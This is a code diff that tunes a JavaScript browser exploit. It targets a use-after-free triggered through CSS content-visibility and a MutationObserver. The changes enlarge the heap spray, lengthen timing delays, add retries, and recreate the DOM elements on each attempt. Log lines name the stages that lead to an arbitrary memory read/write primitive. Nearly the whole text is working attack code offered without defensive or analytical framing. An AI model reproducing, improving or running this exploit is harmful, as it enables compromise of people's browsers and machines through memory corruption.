@@ -62,11 +62,11 @@ const ssv_len = (() => {
     }
 })();
 
-const num_reuses = 10000; // Match PoC heap spray size
-const DELAY = 50; // Adjusted for content-visibility timing
+const num_reuses = 15000; // Increased for better heap spray
+const DELAY = 100; // Adjusted for better timing
 let attemptCount = 0;
 const fakeStates = []; // Global array to store fake state objects
-const MAX_ATTEMPTS = 5; // Max retry attempts
+const MAX_ATTEMPTS = 10; // Increased max retry attempts
 
 function gc() {
     new Uint8Array(4 * MB);
@@ -89,6 +89,12 @@ function sread64(str, offset) {
 }
 
 function prepare_uaf() {
+    // Remove any existing container to avoid conflicts
+    const existingContainer = document.querySelector('.container');
+    if (existingContainer) {
+        existingContainer.remove();
+    }
+
     const container = document.createElement('div');
     container.className = 'container';
     const child = document.createElement('div');
@@ -112,9 +118,11 @@ async function uaf_ssv(container) {
         const fakeState = { data: new ArrayBuffer(ssv_len) };
         fakeStates.push(fakeState);
 
-        const childElement = document.querySelector('.child');
+        // Recreate container and child for each attempt
+        const newContainer = prepare_uaf();
+        const childElement = newContainer.querySelector('.child');
         if (!childElement) {
-            log('Child element not found, retrying...');
+            log('Child element not found after creation, retrying...');
             fakeStates.pop();
             gc();
             await sleep(100);
@@ -127,17 +135,22 @@ async function uaf_ssv(container) {
         });
 
         try {
-            observer.observe(container, { childList: true, subtree: true });
+            observer.observe(newContainer, { childList: true, subtree: true });
 
             // Trigger UAF
-            container.style.contentVisibility = 'hidden';
+            newContainer.style.contentVisibility = 'hidden';
             childElement.remove();
 
             await new Promise(resolve => setTimeout(resolve, DELAY));
 
-            container.style.contentVisibility = 'auto';
+            newContainer.style.contentVisibility = 'auto';
 
-            // Heap spray
+            // Additional heap spray
+            for (let i = 0; i < 200; i++) {
+                new Uint8Array(1024 * 1024);
+            }
+
+            // Heap spray for reuse
             for (let i = 0; i < num_reuses; i++) {
                 const view = new Uint8Array(new ArrayBuffer(ssv_len));
                 view[0] = 0x41;
@@ -168,6 +181,7 @@ async function uaf_ssv(container) {
 
             if (res.length === 2) {
                 observer.disconnect();
+                newContainer.remove(); // Clean up
                 return res;
             }
 
@@ -177,6 +191,7 @@ async function uaf_ssv(container) {
         }
 
         observer.disconnect();
+        newContainer.remove(); // Clean up
         fakeStates.pop();
         views.length = 0;
         gc();
@@ -531,15 +546,15 @@ async function make_arw(reader, view2, pop) {
 export async function main() {
     log('STAGE: UAF content-visibility');
     const container = prepare_uaf();
-    const [view, [view2, pop]] = await uaf_ssv(container);
-
-    log('STAGE: get string relative read primitive');
-    const rdr = await make_rdr(view);
-
-    document.body.removeChild(container);
-
-    log('STAGE: achieve arbitrary read/write primitive');
-    await make_arw(rdr, view2, pop);
+    try {
+        const [view, [view2, pop]] = await uaf_ssv(container);
+        log('STAGE: get string relative read primitive');
+        const rdr = await make_rdr(view);
+        log('STAGE: achieve arbitrary read/write primitive');
+        await make_arw(rdr, view2, pop);
+    } finally {
+        container.remove(); // Ensure cleanup
+    }
 
     clear_log();
     try {
